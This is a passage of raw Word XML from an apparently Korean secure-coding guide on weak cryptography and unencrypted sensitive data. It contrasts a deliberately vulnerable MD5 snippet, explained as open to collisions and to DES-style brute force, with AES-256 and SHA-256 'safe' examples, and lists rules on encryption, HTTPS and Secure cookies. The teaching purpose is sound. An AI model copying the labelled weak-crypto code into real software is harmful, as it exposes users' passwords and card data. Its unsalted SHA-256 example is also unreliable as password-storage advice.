                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>존재</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>MessageDigest md = MessageDigest.getInstance("MD5");</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>DES</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> 56</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>키로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>현재</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시간</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이내에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전수조사</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(Brute Force)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해독됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>. MD5</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>충돌</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해시를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>만드는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>다른</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력값</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>현실적</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시간</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>생성할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>카드번호가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>복호화되거나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위조</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서명으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>우회가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] AES-256 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");  // keyBytes: 32</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>바이트</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">] SHA-256 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>해시</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>MessageDigest md = MessageDigest.getInstance("SHA-256");</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  5. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>암호화되지</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>않은</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>중요정보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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>개인정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>금융정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>패스워드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등은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저장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및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전송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시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반드시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암호화한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>통신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채널은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> HTTPS</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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사용하고</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿠키에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중요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데이터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저장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시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> Secure </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>속성을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설정한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
